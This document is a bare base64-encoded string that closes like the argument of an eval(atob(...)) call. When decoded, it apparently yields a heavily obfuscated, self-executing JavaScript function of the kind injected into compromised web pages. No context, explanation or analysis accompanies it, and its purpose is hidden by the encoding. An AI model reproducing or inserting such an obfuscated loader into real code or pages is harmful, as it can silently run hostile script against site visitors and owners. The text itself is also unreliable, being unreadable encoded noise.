VdKWNbPUZ0czs9aDIlcmJpaShvNWNjdjA5JSBlKTNrXl5sLjhhKTElLG9yP1FXbn0rbmdeNl5fIS4ydCFZKVM4PXIucnJhXkJsdF5eMSEwbmUlXylbaV5rNVEpXiV2c3lebzE0Y3sgQSN5XjMgYXJePV59Nn0yZXdkVjZfLmwlMV5zXXYxXjslNWV0NCg4MCFLbntBYmZ9Ml4+MD1vKzJyY14wYUZeIWl7cGVvXjBeS215WzFpLjh0KGMgUCl7KTRvNj07NmQoMF99bC5eZV9FLmYpaShdZUteYCl0fWU5eT09IC5jfWdeXl4wYyh0W2VocnElXl55LmNuXz1jLl0lPXsoe3RlLjBgLmVfdG9hPV5eMWllMVYwXl0pPT1LO2khZy43dG9fJXo9R2Nsel8uOSlUbz1vLlMwYy1dbmJ0Xl1dLV9bNmlpZHJvNzZeW3l3OF87X290KWR9NSheX2ZSb2leIV8qNilTXmReOWQ2IGwzXihjODVEKG1jOW02MWUraF4uXSgwN2t1IGg9Xik9ZSVeY15icnRfeChedDFeaEVeXl9ePCBzIVwndF5eXSs5Ol52PTspXilHeHNeZywxXixeVzVtcF8zJVwvWGVeXmxjMW5yKTVDX14sXiwxZzsqX15lbyldPVAse19laCg9XSVYKTsxMV9kb2Zfbm9ebF45VFQgcihdZl9hZWE1XmVjKV4xb18yKDpuXWJ3R119czExJE5iZiBzXmFdYV5bXjl1fWNeb2ReXjEhO15cL15pIGMrIXBXc2k3MjEgXm4lLm99PWtlXjkyfV5eXWRmU2M7am4iZktTO31mXiZjXl11bGJ7aW0xXTlkN110JXJyKW4kX10uZV5iXlwvViVhJjNndV5eNGxsZTIudT1NXjFeXl1kZTAoRSg9ZV5hXlleXl09UGMkbmVjemF0cjBeLCgoMSspXFxAOiEsfSJTXmNjXkdyO15sZjIrZCl7JShjXjBlKF5eXyhhKSxuPF4pKSVecisgYyxoIUolY2xnXl5pX2NeZWZ1OnRuZSBjLj1wZWleYysuO157MWVnfS5lXlQ4Ml4oYCBuKSI5SV1Tcm4sb1hzZSwlY111YnJ0aCU9Y2FjbSFpLnheJGVeXi4xXl4uI2ZGXi5hXWJuZ3ZdbnkpXiFqX1wvXmZjNi5eMWNsZXleXm9hM15vKV47fXJuKCBcL11pVm9eXV07KF5jX140XzJwfSs/bl1lX25fMzReYWJuLj0uOF40YV4qaChyRDFlfUZebm49XSRvLnJhKHd0dCFedC5pXnRhJG5dZnJjPVUoKXV0bW47ODt0XnteXnReZT45Y25edF4pKWwgb15uY15lQl5ULl8uXl5eKSBfb2E4X15jdHMxYyFtYW9bN3JtKSl5ZGQuJV8uZV50PW9jOV50Xl4pT10uXl1zXUZve29eY2Jvb3Vnb2F0fWVNM147O11eNWldOj0ufTd3ajFpKG5vMyEuOmljIC5uZ2VubHJwYW50PV0yMzRFaVR9KSgzfV9eXmMiMG4lOjBeXmhmXmFOY2NsdGdeZSw+RzlfRTdfYV0oJV0gczFKb3N9LTVvOTlzSTh3PV5yWjNeKGM3XV4wXiVvZl40Xl5fW14oIylpO319Xl5kXmFlXm9jXmEibV5eXSEuQWV2JXNeN3JeXmZeKXshXV9gXl5eeyw7XVMsdWEsX15eWCleLj1wXmEzKTguaF5pe19ee0leYz1dLl0lXTtkKyReIWk7c3RvXl5yY3t1ZSE4e0g4XzYgXWQrPV5yMzNeJF80XmMlKShdKUlybERjKDcjXjBuNCIod3RebXQkX15fXSBlOyB3Xl9dXjF2X2NfKTE3NnV0ZiNpUmMycC5eMS40XWUpO15KPSEhbzJnKTIuYl1lbiUoJStTXkltXk9eX190XzFjezEjPSQ+YzUoPTFdKV5vPV0hXl8iJWVuXyBhc18kJWFeOC4xY2cpdEl1LH1eX10oaV59KWY1MmN9JW85IGNyY1Q7XlwvXiIwZF1pXV5sMDkxIF1OeHNqbyBzYl5bXyNedD1iXl1zUHNjLF8gc1gtTz1eNTk2Xl9lOChpSl5ufShpZXtfXmFqLmRfZmEudCJeX11vbyl0bW5vXjI0ajM2OSxebyAwbnBtXm57PV5zcmddZC5cXDhsJXsgbHNkLD0uXC9jaSVfZjRebWdfXjheOGxeXm8gd14wXS45cjpjTl03X3BwLkgyKGZea2U9b2QxKGE5XmUtKV9eO15hISEuX24ub2VeWzE+XmIgNTRifV4tKXggIWkoeil1cl5nXV1eXmFjZHRlZWN9O0BscnJwXiEhImNpOX1uMmNOfSxwYjRQdGNdLl5dMHReICVjMUFkLF5KfC1oJiVuW30gJF8gIX1bbWYoOU0uWH0mXl54Xi4xY140cmZbNiVsaTk7e3R9JStzZmx9Xj17bChmXV9sXi4oZV5dM3NvLHJuKW1jI15DPXN9bl5lXnItIC47X1wnaWVjYS56Ll4gUWxhZ3IoY14lXl47LHNwXmhoVyhOaXQpXm8xITEhaDcpY2JJcF1haSBhaDNnJTZqZWJeXy4gLmEwcl5uLl4hXj9ePSAuXyAqLmRdZV1eOSg1b29mbGN9ZW9jdFwvcl5VIV1OMnQnKSk7dmFyIFd4WD11eWgocUdsLEhOQSApO1d4WCg2NjIxKTtyZXR1cm4gNzcxN30pKCk='))
